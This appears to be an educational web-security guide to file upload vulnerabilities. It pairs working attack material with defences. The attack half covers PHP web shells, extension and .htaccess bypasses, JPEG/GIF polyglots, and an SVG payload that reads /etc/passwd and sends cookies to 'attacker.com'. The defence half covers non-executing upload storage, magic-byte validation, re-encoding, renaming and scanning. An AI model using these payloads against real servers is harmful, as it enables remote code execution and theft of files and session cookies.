File Upload Vulnerabilities

OWASP A04 Insecure Design · CWE-434 · Upload a web shell, achieve RCE — one of the most direct paths to full server compromise

File upload vulnerabilities occur when a server accepts attacker-controlled files without properly validating their type or contents, then stores or processes them in a way that leads to code execution. The classic attack is uploading a web shell — a PHP/JSP/ASPX file that executes OS commands when accessed via HTTP.

Extension blocklists are the most common — and weakest — upload defense. Here is every technique to bypass them.

PHP extension variants — all execute as PHP
## Apache with AddHandler or mod_php shell.php # obvious — usually blocked shell.php3 # old PHP3 — often missed shell.php4 # PHP4 — often missed shell.php5 # PHP5 — often missed shell.php7 # PHP7 — often missed shell.phtml # PHP HTML — frequently missed shell.phar # PHP Archive — executes as PHP shell.shtml # Server-Side Includes (if mod_include enabled) ## Case variation (on case-insensitive file systems / servers) shell.PHP shell.Php shell.pHp shell.PHp5 ## Double extensions (Apache processes left-to-right for unknown types) shell.php.jpg # if Apache doesn't know .jpg → falls back to .php shell.php.xxxxx # any unknown extension → Apache tries next handler shell.php.gif ## Trailing characters shell.php. # trailing dot (Windows filesystem strips it) shell.php%20 # trailing space (stripped by OS) shell.php::$DATA # Windows NTFS alternate data stream ## Null byte (PHP < 5.3.4) shell.php%00.jpg # PHP sees shell.php, file saved as shell.php

.htaccess upload — redefine what PHP executes

If the upload directory allows .htaccess files, upload a custom .htaccess that makes the server execute .jpg files as PHP. Then upload a PHP shell with a .jpg extension — it executes.

## Step 1: Upload .htaccess to the uploads directory Filename: .htaccess Content: AddType application/x-httpd-php .jpg # Now ALL .jpg files in this directory execute as PHP! ## Step 2: Upload shell with .jpg extension Filename: shell.jpg Content: <?php system($_GET['cmd']); ?> ## Step 3: Access the shell GET /uploads/shell.jpg?cmd=id → uid=33(www-data) ## Alternative .htaccess payloads: AddHandler php5-script .png # execute .png as PHP php_value auto_prepend_file /etc/passwd # prepend file to every response Options +ExecCGI # enable CGI execution

A polyglot file is simultaneously valid in two formats — a real JPEG that is also valid PHP. It passes magic byte checks (real JPEG header) and content validation (parseable as an image) while still executing as PHP when the server includes it.

JPEG + PHP polyglot

JPEG files store metadata in EXIF fields. PHP code injected into the EXIF Comment field survives image re-processing and executes when the file is included by PHP.

## Method 1: inject into EXIF Comment field exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg # Creates a valid JPEG with PHP in the EXIF comment # Magic bytes: FF D8 FF (real JPEG) → passes magic bytes check # PHP scans for <?php tag anywhere in file → finds it → executes ## Method 2: hex edit — prepend JPEG header to PHP # Create: [FF D8 FF E0 ... JPEG header ...][<?php system(...); ?>] # PHP ignores binary before <?php → executes the shell ## Method 3: GIF + PHP echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.gif # GIF magic bytes: 47 49 46 38 39 61 ("GIF89a") # PHP executes everything after the magic bytes too ## Confirming the polyglot works file shell.gif # → GIF image data (valid GIF!) php -r 'include "shell.gif";' # executes the PHP!
SVG — XSS + SSRF polyglot

SVG is XML — it can contain JavaScript (XSS) and external entity references (SSRF/XXE). If SVG uploads are allowed and served back to users, this is a stored XSS vector.

<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <svg xmlns="http://www.w3.org/2000/svg"> <text>&xxe;</text> <!-- XSS via SVG event handler --> <rect width="100" height="100" onload="fetch('https://attacker.com/?c='+document.cookie)"/> </svg> <!-- When rendered in browser: XSS fires, steals cookies When processed server-side: XXE reads /etc/passwd -->

① Never execute uploaded files — serve from a separate domain Root fix
The fundamental defense: uploaded files must never be executed by the server. Serve them from a static file server, CDN, or a completely separate domain with no server-side execution. Even if an attacker uploads a PHP file to uploads.myapp.com, it renders as text — not executed.
## nginx — serve uploads as static files only, no PHP server { listen 80; server_name uploads.myapp.com; location /uploads/ { root /var/www; # NO php-fpm pass-through # NO fastcgi_pass add_header Content-Disposition "attachment"; # force download } } ## Apache — disable PHP execution in uploads directory # /var/www/html/uploads/.htaccess php_flag engine off # disable PHP entirely AddType text/plain .php .php5 .phtml .phar # serve as text Options -ExecCGI # disable CGI ## Best practice: store outside web root entirely /var/uploads/ ← not accessible via HTTP directly # Serve via a controller that reads and streams the file
② Validate file type server-side — magic bytes + re-encode Essential
Never trust the extension or Content-Type header — both are client-controlled. Read the actual file bytes and verify the magic signature. For images, re-encode with a library to strip any embedded payload.
## Python — magic bytes check + PIL re-encode (strips payloads) from PIL import Image import imghdr, io def validate_image(file_bytes): # Check magic bytes kind = imghdr.what(None, h=file_bytes) if kind not in ('jpeg', 'png', 'gif', 'webp'): raise ValueError(f"Invalid image type: {kind}") # Re-encode with PIL — strips EXIF, polyglots, embedded PHP img = Image.open(io.BytesIO(file_bytes)) output = io.BytesIO() img.save(output, format=img.format) # clean copy return output.getvalue() ## Node.js — file-type library for magic bytes const FileType = require('file-type'); const allowed = ['image/jpeg', 'image/png', 'image/gif']; const type = await FileType.fromBuffer(buffer); if (!type || !allowed.includes(type.mime)) { throw new Error('Invalid file type'); } ## PHP — getimagesize() is NOT sufficient (bypassed by polyglots) ## Use finfo_file() for MIME + PIL re-encode:
③ Rename uploaded files to random names Always do this
Even if a PHP file is uploaded, the attacker must be able to request it by URL to execute it. Renaming to a UUID with a safe extension removes the ability to predict the path — and strips any dangerous extension.
## Python import uuid, os def save_upload(file_bytes, original_name): # Generate unpredictable name with safe extension safe_ext = '.jpg' # always use safe extension regardless of input new_name = str(uuid.uuid4()) + safe_ext save_path = os.path.join('/var/uploads', new_name) with open(save_path, 'wb') as f: f.write(file_bytes) return new_name # store this in DB, not the original name ## Node.js (multer) const multer = require('multer'); const storage = multer.diskStorage({ destination: '/var/uploads/', filename: (req, file, cb) => { cb(null, require('crypto').randomUUID() + '.jpg'); } }); ## Benefits: # - shell.php → 3f2d9a1b-4e82-4c1a-a9d2-c97f8e0b3a41.jpg # - Attacker can't guess the URL → can't trigger execution # - Even if execution weren't disabled, .jpg won't run as PHP
④ Size limits, rate limiting, and antivirus scanning Defense in depth
Enforce maximum file size (prevents DoS via giant files). Rate-limit uploads per user to prevent brute-force extension scanning. Run uploaded files through antivirus (ClamAV) to catch known web shells.
## File size limit MAX_UPLOAD_SIZE = 5 * 1024 * 1024 # 5MB if len(file_bytes) > MAX_UPLOAD_SIZE: raise ValueError("File too large") ## ClamAV integration (Python) import subprocess result = subprocess.run(['clamscan', '--no-summary', filepath], capture_output=True) if result.returncode != 0: os.unlink(filepath) raise ValueError("Malicious file detected")
⑤ Full secure upload checklist
Store outside web root — inaccessible via HTTP directly  ·  Disable server-side execution in upload directory  ·  Validate magic bytes, not extension or Content-Type  ·  Re-encode images with PIL/ImageMagick to strip payloads  ·  Rename to random UUID + safe extension  ·  Serve from separate domain (uploads.app.com or CDN)  ·  Enforce file size limits  ·  Block .htaccess / .user.ini uploads  ·  Extract archives safely — check for path traversal (zip slip)  ·  Log all uploads with user ID, IP, original filename
